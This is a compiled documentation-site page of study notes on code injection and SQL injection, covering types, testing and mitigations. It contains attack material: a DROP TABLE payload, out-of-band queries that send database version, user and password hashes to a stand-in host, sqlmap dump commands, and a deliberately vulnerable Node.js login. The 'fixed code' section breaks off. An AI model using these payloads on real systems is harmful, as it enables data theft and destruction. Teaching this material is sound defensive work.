import{f as e,h as t,j as n,t as r}from"./chunks/plugin-vue_export-helper.Dz-VHcSB.js";const i=JSON.parse(`{"title":"Code Injection","description":"Code injection is the exploitation of a computer bug that is caused by processing invalid data","frontmatter":{"title":"Code Injection","description":"Code injection is the exploitation of a computer bug that is caused by processing invalid data"},"headers":[],"relativePath":"Concepts/Application_Security/Code_Injection.md","filePath":"Concepts/Application_Security/Code_Injection.md","lastUpdated":1766945700000}`);var a={name:`Concepts/Application_Security/Code_Injection.md`};function o(r,i,a,o,s,c){return n(),e(`div`,null,[...i[0]||=[t(`<h1 id="code-injection" tabindex="-1">Code Injection <a class="header-anchor" href="#code-injection" aria-label="Permalink to “Code Injection”">​</a></h1><p>Untrusted user input is interpreted <strong>by server and executed</strong></p><h2 id="impact" tabindex="-1">Impact <a class="header-anchor" href="#impact" aria-label="Permalink to “Impact”">​</a></h2><p>Data can be stolen, modified, or deleted</p><h2 id="sql-injection" tabindex="-1">SQL Injection <a class="header-anchor" href="#sql-injection" aria-label="Permalink to “SQL Injection”">​</a></h2><p>SQL injection occur when an attacker is able to inject SQL queries via the input data of an application</p><ul><li>When data enters a program from an untrusted source and that data is used to dynamically construct a SQL query</li><li>SQL doesn&#39;t distinguish between the control plane and the data plane</li><li>The attacker can place a meta character (a character not interpreted as data, such as an underscore <code>_</code> which, in SQL, will read as a wild card for a single character) into data input, then follow by entering SQL commands in the control plane</li></ul><p>A successful attack allows an attacker to access and manipulate the backend database</p><p>Causes:</p><ul><li>User input is used to dynamically build queries</li><li>If input is not but validated the query interrupted</li><li>Can be tricked into running arbitrary SQL queries or commands</li></ul><p><em>Example:</em> If the string <code>Robert&#39;); DROP TABLE Students;–-</code> were entered into a query which requested the <code>studentName</code>, then the query would become the following:</p><div class="language-sql"><button title="Copy Code" class="copy"></button><span class="lang">sql</span><pre class="shiki shiki-themes vitesse-dark github-light" style="--shiki-dark:#dbd7caee;--shiki-light:#24292e;--shiki-dark-bg:#121212;--shiki-light-bg:#fff;" tabindex="0" dir="ltr"><code><span class="line"><span style="--shiki-dark:#4D9375;--shiki-light:#D73A49;">AND</span><span style="--shiki-dark:#DBD7CAEE;--shiki-light:#24292E;"> studentName </span><span style="--shiki-dark:#CB7676;--shiki-light:#D73A49;">=</span><span style="--shiki-dark:#C98A7D77;--shiki-light:#032F62;"> &#39;</span><span style="--shiki-dark:#C98A7D;--shiki-light:#032F62;">Robert</span><span style="--shiki-dark:#C98A7D77;--shiki-light:#032F62;">&#39;</span><span style="--shiki-dark:#DBD7CAEE;--shiki-light:#24292E;">;</span></span>
<span class="line"><span style="--shiki-dark:#4D9375;--shiki-light:#D73A49;">DROP</span><span style="--shiki-dark:#4D9375;--shiki-light:#D73A49;"> TABLE</span><span style="--shiki-dark:#DBD7CAEE;--shiki-light:#24292E;"> Students;</span></span>
<span class="line"><span style="--shiki-dark:#758575DD;--shiki-light:#6A737D;">--&#39;</span></span></code></pre></div><h3 id="types-of-sql-injection" tabindex="-1">Types of SQL Injection <a class="header-anchor" href="#types-of-sql-injection" aria-label="Permalink to “Types of SQL Injection”">​</a></h3><ol><li><p><strong>Error-Based SQL Injection</strong>: The attacker relies on detailed error messages from the database to learn about the database structure</p><ul><li>In order to prevent this, only generic error messages should be shown</li></ul></li><li><p><strong>Blind SQL Injection</strong>: When the web application is configured to show generic error messages, but has not mitigated the code that is vulnerable to SQL injection</p><p>The attacker doesn&#39;t receive direct error messages or query results from the database. Instead an attacker may verify whether a sent request returned true or false in a few ways:</p><ol><li><p><em>Content-based attacks</em></p></li><li><p><em>Time-based attacks</em> (where the attacker measures the time it takes for the application to respond to different queries)</p></li></ol><ul><li>When the database does not output data to the web page, an attacker is forced to steal data by asking the database a series of true or false questions</li><li>This makes exploiting the SQL Injection vulnerability more difficult, but not impossible</li></ul></li><li><p><strong>UNION SQL Injection</strong>:</p><ul><li>Leverages the UNION operator to retrieve data from multiple tables in the database</li></ul></li><li><p><strong>Out of Band SQL Injection</strong>: (more advanced and sophisticated, relatively uncommon) When an attacker can&#39;t receive a response to their command in the same channel they submitted it</p><ul><li>Instead, it relies upon a server&#39;s ability to use another protocol (like HTTP or DNS) to deliver the responses to an attacker&#39;s query</li><li>Instead, they force the database to make external connections to deliver the results of the query</li></ul><p><em>Example:</em> Out-of-band SQL injection in:</p><div class="language-sql"><button title="Copy Code" class="copy"></button><span class="lang">sql</span><pre class="shiki shiki-themes vitesse-dark github-light" style="--shiki-dark:#dbd7caee;--shiki-light:#24292e;--shiki-dark-bg:#121212;--shiki-light-bg:#fff;" tabindex="0" dir="ltr"><code><span class="line"><span style="--shiki-dark:#758575DD;--shiki-light:#6A737D;">-- MySQL</span></span>
<span class="line"><span style="--shiki-dark:#4D9375;--shiki-light:#D73A49;">SELECT</span><span style="--shiki-dark:#DBD7CAEE;--shiki-light:#24292E;"> load_file(</span><span style="--shiki-dark:#B8A965;--shiki-light:#005CC5;">CONCAT</span><span style="--shiki-dark:#DBD7CAEE;--shiki-light:#24292E;">(</span><span style="--shiki-dark:#C98A7D77;--shiki-light:#032F62;">&#39;</span><span style="--shiki-dark:#C98A7D;--shiki-light:#032F62;">\\\\\\\\</span><span style="--shiki-dark:#C98A7D77;--shiki-light:#032F62;">&#39;</span><span style="--shiki-dark:#DBD7CAEE;--shiki-light:#24292E;">,(</span><span style="--shiki-dark:#4D9375;--shiki-light:#D73A49;">SELECT</span><span style="--shiki-dark:#CB7676;--shiki-light:#D73A49;">+</span><span style="--shiki-dark:#DBD7CAEE;--shiki-light:#24292E;">@@</span><span style="--shiki-dark:#4D9375;--shiki-light:#D73A49;">version</span><span style="--shiki-dark:#DBD7CAEE;--shiki-light:#24292E;">),</span><span style="--shiki-dark:#C98A7D77;--shiki-light:#032F62;">&#39;</span><span style="--shiki-dark:#C98A7D;--shiki-light:#032F62;">.</span><span style="--shiki-dark:#C98A7D77;--shiki-light:#032F62;">&#39;</span><span style="--shiki-dark:#DBD7CAEE;--shiki-light:#24292E;">,(</span><span style="--shiki-dark:#4D9375;--shiki-light:#D73A49;">SELECT</span><span style="--shiki-dark:#CB7676;--shiki-light:#D73A49;">+</span><span style="--shiki-dark:#DBD7CAEE;--shiki-light:#24292E;">user),</span><span style="--shiki-dark:#C98A7D77;--shiki-light:#032F62;">&#39;</span><span style="--shiki-dark:#C98A7D;--shiki-light:#032F62;">.</span><span style="--shiki-dark:#C98A7D77;--shiki-light:#032F62;">&#39;</span><span style="--shiki-dark:#DBD7CAEE;--shiki-light:#24292E;">, (</span><span style="--shiki-dark:#4D9375;--shiki-light:#D73A49;">SELECT</span><span style="--shiki-dark:#CB7676;--shiki-light:#D73A49;">+</span><span style="--shiki-dark:#4D9375;--shiki-light:#D73A49;">password</span><span style="--shiki-dark:#DBD7CAEE;--shiki-light:#24292E;">),</span><span style="--shiki-dark:#C98A7D77;--shiki-light:#032F62;">&#39;</span><span style="--shiki-dark:#C98A7D;--shiki-light:#032F62;">.</span><span style="--shiki-dark:#C98A7D77;--shiki-light:#032F62;">&#39;</span><span style="--shiki-dark:#DBD7CAEE;--shiki-light:#24292E;">,</span><span style="--shiki-dark:#C99076;--shiki-light:#005CC5;">example</span><span style="--shiki-dark:#DBD7CAEE;--shiki-light:#24292E;">.</span><span style="--shiki-dark:#C99076;--shiki-light:#005CC5;">com</span><span style="--shiki-dark:#DBD7CAEE;--shiki-light:#24292E;">\\\\</span><span style="--shiki-dark:#C99076;--shiki-light:#005CC5;">test</span><span style="--shiki-dark:#DBD7CAEE;--shiki-light:#24292E;">.</span><span style="--shiki-dark:#C99076;--shiki-light:#005CC5;">txt</span><span style="--shiki-dark:#C98A7D77;--shiki-light:#032F62;">&#39;</span><span style="--shiki-dark:#C98A7D;--shiki-light:#032F62;">));</span></span></code></pre></div><div class="language-sql"><button title="Copy Code" class="copy"></button><span class="lang">sql</span><pre class="shiki shiki-themes vitesse-dark github-light" style="--shiki-dark:#dbd7caee;--shiki-light:#24292e;--shiki-dark-bg:#121212;--shiki-light-bg:#fff;" tabindex="0" dir="ltr"><code><span class="line"><span style="--shiki-dark:#758575DD;--shiki-light:#6A737D;">-- PostgreSQL</span></span>
<span class="line"><span style="--shiki-dark:#4D9375;--shiki-light:#D73A49;">DROP</span><span style="--shiki-dark:#4D9375;--shiki-light:#D73A49;"> TABLE</span><span style="--shiki-dark:#4D9375;--shiki-light:#D73A49;"> IF</span><span style="--shiki-dark:#4D9375;--shiki-light:#D73A49;"> EXISTS</span><span style="--shiki-dark:#DBD7CAEE;--shiki-light:#24292E;"> table_output;</span></span>
<span class="line"><span style="--shiki-dark:#4D9375;--shiki-light:#D73A49;">CREATE</span><span style="--shiki-dark:#4D9375;--shiki-light:#D73A49;"> TABLE</span><span style="--shiki-dark:#80A665;--shiki-light:#6F42C1;"> table_output</span><span style="--shiki-dark:#DBD7CAEE;--shiki-light:#24292E;">(content </span><span style="--shiki-dark:#CB7676;--shiki-light:#D73A49;">text</span><span style="--shiki-dark:#DBD7CAEE;--shiki-light:#24292E;">);</span></span>
<span class="line"><span style="--shiki-dark:#4D9375;--shiki-light:#D73A49;">CREATE OR REPLACE</span><span style="--shiki-dark:#4D9375;--shiki-light:#D73A49;"> FUNCTION</span><span style="--shiki-dark:#80A665;--shiki-light:#6F42C1;"> temp_function</span><span style="--shiki-dark:#666666;--shiki-light:#24292E;">()</span><span style="--shiki-dark:#4D9375;--shiki-light:#D73A49;">RETURNS</span><span style="--shiki-dark:#DBD7CAEE;--shiki-light:#24292E;"> VOID </span><span style="--shiki-dark:#4D9375;--shiki-light:#D73A49;">AS</span><span style="--shiki-dark:#DBD7CAEE;--shiki-light:#24292E;"> $$ </span><span style="--shiki-dark:#4D9375;--shiki-light:#D73A49;">DECLARE</span><span style="--shiki-dark:#DBD7CAEE;--shiki-light:#24292E;"> exec_cmd </span><span style="--shiki-dark:#CB7676;--shiki-light:#D73A49;">TEXT</span><span style="--shiki-dark:#DBD7CAEE;--shiki-light:#24292E;">;</span></span>
<span class="line"><span style="--shiki-dark:#4D9375;--shiki-light:#D73A49;">DECLARE</span><span style="--shiki-dark:#DBD7CAEE;--shiki-light:#24292E;"> query_result_version </span><span style="--shiki-dark:#CB7676;--shiki-light:#D73A49;">TEXT</span><span style="--shiki-dark:#DBD7CAEE;--shiki-light:#24292E;">;</span></span>
<span class="line"><span style="--shiki-dark:#4D9375;--shiki-light:#D73A49;">DECLARE</span><span style="--shiki-dark:#DBD7CAEE;--shiki-light:#24292E;"> query_result_user </span><span style="--shiki-dark:#CB7676;--shiki-light:#D73A49;">TEXT</span><span style="--shiki-dark:#DBD7CAEE;--shiki-light:#24292E;">;</span></span>
<span class="line"><span style="--shiki-dark:#4D9375;--shiki-light:#D73A49;">DECLARE</span><span style="--shiki-dark:#DBD7CAEE;--shiki-light:#24292E;"> query_result_password </span><span style="--shiki-dark:#CB7676;--shiki-light:#D73A49;">TEXT</span><span style="--shiki-dark:#DBD7CAEE;--shiki-light:#24292E;">;</span></span>
<span class="line"><span style="--shiki-dark:#4D9375;--shiki-light:#D73A49;">BEGIN</span></span>
<span class="line"><span style="--shiki-dark:#4D9375;--shiki-light:#D73A49;">  SELECT</span><span style="--shiki-dark:#4D9375;--shiki-light:#D73A49;"> INTO</span><span style="--shiki-dark:#DBD7CAEE;--shiki-light:#24292E;"> query_result_version (</span><span style="--shiki-dark:#4D9375;--shiki-light:#D73A49;">SELECT</span><span style="--shiki-dark:#DBD7CAEE;--shiki-light:#24292E;"> current_setting(</span><span style="--shiki-dark:#C98A7D77;--shiki-light:#032F62;">&#39;</span><span style="--shiki-dark:#C98A7D;--shiki-light:#032F62;">server_version</span><span style="--shiki-dark:#C98A7D77;--shiki-light:#032F62;">&#39;</span><span style="--shiki-dark:#DBD7CAEE;--shiki-light:#24292E;">));</span></span>
<span class="line"><span style="--shiki-dark:#4D9375;--shiki-light:#D73A49;">  SELECT</span><span style="--shiki-dark:#4D9375;--shiki-light:#D73A49;"> INTO</span><span style="--shiki-dark:#DBD7CAEE;--shiki-light:#24292E;"> query_result_user (</span><span style="--shiki-dark:#4D9375;--shiki-light:#D73A49;">SELECT</span><span style="--shiki-dark:#DBD7CAEE;--shiki-light:#24292E;"> usename </span><span style="--shiki-dark:#4D9375;--shiki-light:#D73A49;">FROM</span><span style="--shiki-dark:#DBD7CAEE;--shiki-light:#24292E;"> pg_shadow);</span></span>
<span class="line"><span style="--shiki-dark:#4D9375;--shiki-light:#D73A49;">  SELECT</span><span style="--shiki-dark:#4D9375;--shiki-light:#D73A49;"> INTO</span><span style="--shiki-dark:#DBD7CAEE;--shiki-light:#24292E;"> query_result_password (</span><span style="--shiki-dark:#4D9375;--shiki-light:#D73A49;">SELECT</span><span style="--shiki-dark:#DBD7CAEE;--shiki-light:#24292E;"> passwd </span><span style="--shiki-dark:#4D9375;--shiki-light:#D73A49;">FROM</span><span style="--shiki-dark:#DBD7CAEE;--shiki-light:#24292E;"> pg_shadow);</span></span>
<span class="line"><span style="--shiki-dark:#DBD7CAEE;--shiki-light:#24292E;">  exec_cmd :</span><span style="--shiki-dark:#CB7676;--shiki-light:#D73A49;">=</span><span style="--shiki-dark:#DBD7CAEE;--shiki-light:#24292E;"> E</span><span style="--shiki-dark:#C98A7D77;--shiki-light:#032F62;">&#39;</span><span style="--shiki-dark:#C98A7D;--shiki-light:#032F62;">COPY table_output(content)</span></span>
<span class="line"><span style="--shiki-dark:#C98A7D;--shiki-light:#032F62;">    FROM E</span><span style="--shiki-dark:#C99076;--shiki-light:#005CC5;">\\&#39;\\\\\\\\\\\\\\\\</span><span style="--shiki-dark:#C98A7D77;--shiki-light:#032F62;">&#39;</span><span style="--shiki-dark:#CB7676;--shiki-light:#D73A49;">||</span><span style="--shiki-dark:#DBD7CAEE;--shiki-light:#24292E;">query_result_version</span><span style="--shiki-dark:#CB7676;--shiki-light:#D73A49;">||</span><span style="--shiki-dark:#C98A7D77;--shiki-light:#032F62;">&#39;</span><span style="--shiki-dark:#C98A7D;--shiki-light:#032F62;">.</span><span style="--shiki-dark:#C98A7D77;--shiki-light:#032F62;">&#39;</span><span style="--shiki-dark:#CB7676;--shiki-light:#D73A49;">||</span><span style="--shiki-dark:#DBD7CAEE;--shiki-light:#24292E;">query_result_user</span><span style="--shiki-dark:#CB7676;--shiki-light:#D73A49;">||</span><span style="--shiki-dark:#C98A7D77;--shiki-light:#032F62;">&#39;</span><span style="--shiki-dark:#C98A7D;--shiki-light:#032F62;">.</span><span style="--shiki-dark:#C98A7D77;--shiki-light:#032F62;">&#39;</span><span style="--shiki-dark:#CB7676;--shiki-light:#D73A49;">||</span><span style="--shiki-dark:#DBD7CAEE;--shiki-light:#24292E;">query_result_password</span><span style="--shiki-dark:#CB7676;--shiki-light:#D73A49;">||</span><span style="--shiki-dark:#DBD7CAEE;--shiki-light:#24292E;">E</span><span style="--shiki-dark:#C98A7D77;--shiki-light:#032F62;">&#39;</span><span style="--shiki-dark:#C98A7D;--shiki-light:#032F62;">.example.com\\\\\\\\test.txt\\</span><span style="--shiki-dark:#C98A7D77;--shiki-light:#032F62;">&#39;&#39;</span><span style="--shiki-dark:#C98A7D;--shiki-light:#032F62;">;</span></span>
<span class="line"><span style="--shiki-dark:#C98A7D;--shiki-light:#032F62;">  EXECUTE exec_cmd;</span></span>
<span class="line"><span style="--shiki-dark:#C98A7D;--shiki-light:#032F62;">END;</span></span>
<span class="line"><span style="--shiki-dark:#C98A7D;--shiki-light:#032F62;">$$ LANGUAGE plpgsql SECURITY DEFINER;</span></span>
<span class="line"><span style="--shiki-dark:#C98A7D;--shiki-light:#032F62;">SELECT temp_function();</span></span></code></pre></div></li></ol><h3 id="testing" tabindex="-1">Testing <a class="header-anchor" href="#testing" aria-label="Permalink to “Testing”">​</a></h3><p>Using <a href="https://sqlmap.org/" target="_blank" rel="noreferrer"><code>sqlmap</code></a> a penetration testing tool that automates the process of detecting and exploiting SQL injection flaws</p><p><em>Example:</em> Vulnerable URL: <code>http://testphp.vulnweb.com/listproducts.php?cat=1</code></p><ol><li><p>List information about the existing databases</p><div class="language-bash"><button title="Copy Code" class="copy"></button><span class="lang">bash</span><pre class="shiki shiki-themes vitesse-dark github-light" style="--shiki-dark:#dbd7caee;--shiki-light:#24292e;--shiki-dark-bg:#121212;--shiki-light-bg:#fff;" tabindex="0" dir="ltr"><code><span class="line"><span style="--shiki-dark:#80A665;--shiki-light:#6F42C1;">sqlmap</span><span style="--shiki-dark:#C99076;--shiki-light:#005CC5;"> -u</span><span style="--shiki-dark:#C98A7D;--shiki-light:#032F62;"> http://testphp.vulnweb.com/listproducts.php?cat=</span><span style="--shiki-dark:#4C9A91;--shiki-light:#005CC5;">1</span><span style="--shiki-dark:#C99076;--shiki-light:#005CC5;"> --dbs</span></span></code></pre></div></li><li><p>List information about Tables present in a particular Database</p><div class="language-bash"><button title="Copy Code" class="copy"></button><span class="lang">bash</span><pre class="shiki shiki-themes vitesse-dark github-light" style="--shiki-dark:#dbd7caee;--shiki-light:#24292e;--shiki-dark-bg:#121212;--shiki-light-bg:#fff;" tabindex="0" dir="ltr"><code><span class="line"><span style="--shiki-dark:#80A665;--shiki-light:#6F42C1;">sqlmap</span><span style="--shiki-dark:#C99076;--shiki-light:#005CC5;"> -u</span><span style="--shiki-dark:#C98A7D;--shiki-light:#032F62;"> http://testphp.vulnweb.com/listproducts.php?cat=</span><span style="--shiki-dark:#4C9A91;--shiki-light:#005CC5;">1</span><span style="--shiki-dark:#C99076;--shiki-light:#005CC5;"> -D</span><span style="--shiki-dark:#C98A7D;--shiki-light:#032F62;"> acuart</span><span style="--shiki-dark:#C99076;--shiki-light:#005CC5;"> --tables</span></span></code></pre></div></li><li><p>List information about the columns of a particular table</p><div class="language-bash"><button title="Copy Code" class="copy"></button><span class="lang">bash</span><pre class="shiki shiki-themes vitesse-dark github-light" style="--shiki-dark:#dbd7caee;--shiki-light:#24292e;--shiki-dark-bg:#121212;--shiki-light-bg:#fff;" tabindex="0" dir="ltr"><code><span class="line"><span style="--shiki-dark:#80A665;--shiki-light:#6F42C1;">sqlmap</span><span style="--shiki-dark:#C99076;--shiki-light:#005CC5;"> -u</span><span style="--shiki-dark:#C98A7D;--shiki-light:#032F62;"> http://testphp.vulnweb.com/listproducts.php?cat=</span><span style="--shiki-dark:#4C9A91;--shiki-light:#005CC5;">1</span><span style="--shiki-dark:#C99076;--shiki-light:#005CC5;"> -D</span><span style="--shiki-dark:#C98A7D;--shiki-light:#032F62;"> acuart</span><span style="--shiki-dark:#C99076;--shiki-light:#005CC5;"> -T</span><span style="--shiki-dark:#C98A7D;--shiki-light:#032F62;"> artists</span><span style="--shiki-dark:#C99076;--shiki-light:#005CC5;"> --columns</span></span></code></pre></div></li><li><p>Dump the data from the columns</p><div class="language-bash"><button title="Copy Code" class="copy"></button><span class="lang">bash</span><pre class="shiki shiki-themes vitesse-dark github-light" style="--shiki-dark:#dbd7caee;--shiki-light:#24292e;--shiki-dark-bg:#121212;--shiki-light-bg:#fff;" tabindex="0" dir="ltr"><code><span class="line"><span style="--shiki-dark:#80A665;--shiki-light:#6F42C1;">sqlmap</span><span style="--shiki-dark:#C99076;--shiki-light:#005CC5;"> -u</span><span style="--shiki-dark:#C98A7D;--shiki-light:#032F62;"> http://testphp.vulnweb.com/listproducts.php?cat=</span><span style="--shiki-dark:#4C9A91;--shiki-light:#005CC5;">1</span><span style="--shiki-dark:#C99076;--shiki-light:#005CC5;"> -D</span><span style="--shiki-dark:#C98A7D;--shiki-light:#032F62;"> acuart</span><span style="--shiki-dark:#C99076;--shiki-light:#005CC5;"> -T</span><span style="--shiki-dark:#C98A7D;--shiki-light:#032F62;"> artists</span><span style="--shiki-dark:#C99076;--shiki-light:#005CC5;"> -C</span><span style="--shiki-dark:#C98A7D;--shiki-light:#032F62;"> aname</span><span style="--shiki-dark:#C99076;--shiki-light:#005CC5;"> --dump</span></span></code></pre></div></li></ol><h3 id="mitigation" tabindex="-1">Mitigation <a class="header-anchor" href="#mitigation" aria-label="Permalink to “Mitigation”">​</a></h3><ul><li><p>Use <strong>parametrized queries or prepared statements</strong></p></li><li><p>Use <strong>Stored Procedures</strong></p><ul><li>The difference between stored procedures and prepared statements is that stored procedures are defined and stored within the database, but called from the application</li></ul></li><li><p>Allow-list Input Validation: Use all or left validation on all user inputs. This ensures all input is checked against and allowed list of input parameters before they are processed in the code</p></li><li><p>Implement proper input sanitization (Escaping All User Supplied Input)</p></li><li><p>Apply the <em>least privilege principal</em> on all database accounts</p></li><li><p>Typically found by penetration testers/secure code review</p></li><li><p>Consider <code>GET</code> and <code>POST</code> parameters cookies and other http headers</p></li><li><p>Use Web Application Firewalls (WAFs) to detect and block suspicious requests</p></li><li><p>Use latest frameworks</p></li></ul><h2 id="get-request" tabindex="-1">GET Request <a class="header-anchor" href="#get-request" aria-label="Permalink to “GET Request”">​</a></h2><h2 id="post-request" tabindex="-1">POST Request <a class="header-anchor" href="#post-request" aria-label="Permalink to “POST Request”">​</a></h2><p>Vulnerable Node.JS code:</p><div class="language-javascript"><button title="Copy Code" class="copy"></button><span class="lang">javascript</span><pre class="shiki shiki-themes vitesse-dark github-light" style="--shiki-dark:#dbd7caee;--shiki-light:#24292e;--shiki-dark-bg:#121212;--shiki-light-bg:#fff;" tabindex="0" dir="ltr"><code><span class="line"><span style="--shiki-dark:#CB7676;--shiki-light:#D73A49;">function</span><span style="--shiki-dark:#80A665;--shiki-light:#6F42C1;"> authenticate</span><span style="--shiki-dark:#666666;--shiki-light:#24292E;">(</span><span style="--shiki-dark:#BD976A;--shiki-light:#E36209;">req</span><span style="--shiki-dark:#666666;--shiki-light:#24292E;">,</span><span style="--shiki-dark:#BD976A;--shiki-light:#E36209;"> res</span><span style="--shiki-dark:#666666;--shiki-light:#24292E;">,</span><span style="--shiki-dark:#BD976A;--shiki-light:#E36209;"> next</span><span style="--shiki-dark:#666666;--shiki-light:#24292E;">){</span></span>
<span class="line"><span style="--shiki-dark:#CB7676;--shiki-light:#D73A49;">  const</span><span style="--shiki-dark:#BD976A;--shiki-light:#005CC5;"> username</span><span style="--shiki-dark:#666666;--shiki-light:#D73A49;"> =</span><span style="--shiki-dark:#BD976A;--shiki-light:#24292E;"> req</span><span style="--shiki-dark:#666666;--shiki-light:#24292E;">.</span><span style="--shiki-dark:#BD976A;--shiki-light:#24292E;">query</span><span style="--shiki-dark:#666666;--shiki-light:#24292E;">.</span><span style="--shiki-dark:#BD976A;--shiki-light:#24292E;">username</span><span style="--shiki-dark:#666666;--shiki-light:#24292E;">,</span></span>
<span class="line"><span style="--shiki-dark:#BD976A;--shiki-light:#005CC5;">        password</span><span style="--shiki-dark:#666666;--shiki-light:#D73A49;"> =</span><span style="--shiki-dark:#BD976A;--shiki-light:#24292E;"> req</span><span style="--shiki-dark:#666666;--shiki-light:#24292E;">.</span><span style="--shiki-dark:#BD976A;--shiki-light:#24292E;">query</span><span style="--shiki-dark:#666666;--shiki-light:#24292E;">.</span><span style="--shiki-dark:#BD976A;--shiki-light:#24292E;">password</span></span>
<span class="line"><span style="--shiki-dark:#CB7676;--shiki-light:#D73A49;">  let</span><span style="--shiki-dark:#BD976A;--shiki-light:#24292E;"> sqlRequest</span><span style="--shiki-dark:#666666;--shiki-light:#D73A49;"> =</span><span style="--shiki-dark:#CB7676;--shiki-light:#D73A49;"> new</span><span style="--shiki-dark:#BD976A;--shiki-light:#24292E;"> sql</span><span style="--shiki-dark:#666666;--shiki-light:#24292E;">.</span><span style="--shiki-dark:#80A665;--shiki-light:#6F42C1;">Request</span><span style="--shiki-dark:#666666;--shiki-light:#24292E;">(),</span></span>
<span class="line"><span style="--shiki-dark:#BD976A;--shiki-light:#24292E;">      sqlQuery</span><span style="--shiki-dark:#666666;--shiki-light:#D73A49;"> =</span><span style="--shiki-dark:#C98A7D77;--shiki-light:#032F62;"> &quot;</span><span style="--shiki-dark:#C98A7D;--shiki-light:#032F62;">select * from users where (username= &#39;</span><span style="--shiki-dark:#C98A7D77;--shiki-light:#032F62;">&quot;</span><span style="--shiki-dark:#CB7676;--shiki-light:#D73A49;"> +</span><span style="--shiki-dark:#BD976A;--shiki-light:#24292E;"> username</span><span style="--shiki-dark:#CB7676;--shiki-light:#D73A49;"> +</span><span style="--shiki-dark:#C98A7D77;--shiki-light:#032F62;"> &quot;</span><span style="--shiki-dark:#C98A7D;--shiki-light:#032F62;">&#39; and password =&#39;</span><span style="--shiki-dark:#C98A7D77;--shiki-light:#032F62;">&quot;</span><span style="--shiki-dark:#CB7676;--shiki-light:#D73A49;"> +</span><span style="--shiki-dark:#BD976A;--shiki-light:#24292E;"> password</span><span style="--shiki-dark:#CB7676;--shiki-light:#D73A49;"> +</span><span style="--shiki-dark:#C98A7D77;--shiki-light:#032F62;"> &quot;</span><span style="--shiki-dark:#C98A7D;--shiki-light:#032F62;">&#39;)</span><span style="--shiki-dark:#C98A7D77;--shiki-light:#032F62;">&quot;</span></span>
<span class="line"><span style="--shiki-dark:#BD976A;--shiki-light:#24292E;">  sqlRequest</span><span style="--shiki-dark:#666666;--shiki-light:#24292E;">.</span><span style="--shiki-dark:#80A665;--shiki-light:#6F42C1;">query</span><span style="--shiki-dark:#666666;--shiki-light:#24292E;">(</span><span style="--shiki-dark:#BD976A;--shiki-light:#24292E;">sqlQuery</span><span style="--shiki-dark:#666666;--shiki-light:#24292E;">).</span><span style="--shiki-dark:#80A665;--shiki-light:#6F42C1;">then</span><span style="--shiki-dark:#666666;--shiki-light:#24292E;">(</span><span style="--shiki-dark:#CB7676;--shiki-light:#D73A49;">function</span><span style="--shiki-dark:#666666;--shiki-light:#24292E;">(</span><span style="--shiki-dark:#BD976A;--shiki-light:#E36209;">recordSet</span><span style="--shiki-dark:#666666;--shiki-light:#24292E;">){</span></span>
<span class="line"><span style="--shiki-dark:#4D9375;--shiki-light:#D73A49;">    if</span><span style="--shiki-dark:#666666;--shiki-light:#24292E;">(</span><span style="--shiki-dark:#BD976A;--shiki-light:#24292E;">recordSet</span><span style="--shiki-dark:#666666;--shiki-light:#24292E;">.</span><span style="--shiki-dark:#B8A965;--shiki-light:#005CC5;">length</span><span style="--shiki-dark:#CB7676;--shiki-light:#D73A49;"> ==</span><span style="--shiki-dark:#4C9A91;--shiki-light:#005CC5;"> 1</span><span style="--shiki-dark:#666666;--shiki-light:#24292E;">){</span></span>
<span class="line"><span style="--shiki-dark:#BD976A;--shiki-light:#24292E;">      loggedIn</span><span style="--shiki-dark:#666666;--shiki-light:#D73A49;"> =</span><span style="--shiki-dark:#4D9375;--shiki-light:#005CC5;"> true</span></span>
<span class="line"><span style="--shiki-dark:#758575DD;--shiki-light:#6A737D;">      //successful log in</span></span>
<span class="line"><span style="--shiki-dark:#666666;--shiki-light:#24292E;">    }</span><span style="--shiki-dark:#4D9375;--shiki-light:#D73A49;"> else</span><span style="--shiki-dark:#666666;--shiki-light:#24292E;"> {</span></span>
<span class="line"><span style="--shiki-dark:#BD976A;--shiki-light:#24292E;">      authentication</span><span style="--shiki-dark:#BD976A;--shiki-light:#24292E;"> failed</span></span>
<span class="line"><span style="--shiki-dark:#666666;--shiki-light:#24292E;">    }</span></span>
<span class="line"><span style="--shiki-dark:#666666;--shiki-light:#24292E;">  })</span></span>
<span class="line"><span style="--shiki-dark:#666666;--shiki-light:#24292E;">  .</span><span style="--shiki-dark:#80A665;--shiki-light:#6F42C1;">catch</span><span style="--shiki-dark:#666666;--shiki-light:#24292E;">(</span><span style="--shiki-dark:#BD976A;--shiki-light:#24292E;">next</span><span style="--shiki-dark:#666666;--shiki-light:#24292E;">)</span></span>
<span class="line"><span style="--shiki-dark:#666666;--shiki-light:#24292E;">}</span></span></code></pre></div><p>Fixed code:</p><div class="language-javascript"><button title="Copy Code" class="copy"></button><span class="lang">javascript</span><pre class="shiki shiki-themes vitesse-dark github-light" style="--shiki-dark:#dbd7caee;--shiki-light:#24292e;--shiki-dark-bg:#121212;--shiki-light-bg:#fff;" tabindex="0" dir="ltr"><code><span class="line"><span style="--shiki-dark:#CB7676;--shiki-light:#D73A49;">function</span><span style="--shiki-dark:#80A665;--shiki-light:#6F42C1;"> authenticate</span><span style="--shiki-dark:#666666;--shiki-light:#24292E;">(</span><span style="--shiki-dark:#BD976A;--shiki-light:#E36209;">req</span><span style="--shiki-dark:#666666;--shiki-light:#24292E;">,</span><span style="--shiki-dark:#BD976A;--shiki-light:#E36209;"> res</span><span style="--shiki-dark:#666666;--shiki-light:#24292E;">,</span><span style="--shiki-dark:#BD976A;--shiki-light:#E36209;"> next</span><span style="--shiki-dark:#666666;--shiki-light:#24292E;">)</span><span style="--shiki-dark:#666666;--shiki-light:#24292E;"> {</span></span>
<span class="line"><span style="--shiki-dark:#CB7676;--shiki-light:#D73A49;">  const</span><span style="--shiki-dark:#BD976A;--shiki-light:#005CC5;"> username</span><span style="--shiki-dark:#666666;--shiki-light:#D73A49;"> =</span><span style="--shiki-dark:#BD976A;--shiki-light:#24292E;"> req</span><span style="--shiki-dark:#666666;--shiki-light:#24292E;">.</span><span style="--shiki-dark:#BD976A;--shiki-light:#24292E;">query</span><span style="--shiki-dark:#666666;--shiki-light:#24292E;">.</span><span style="--shiki-dark:#BD976A;--shiki-light:#24292E;">username</span><span style="--shiki-dark:#666666;--shiki-light:#24292E;">,</span></span>
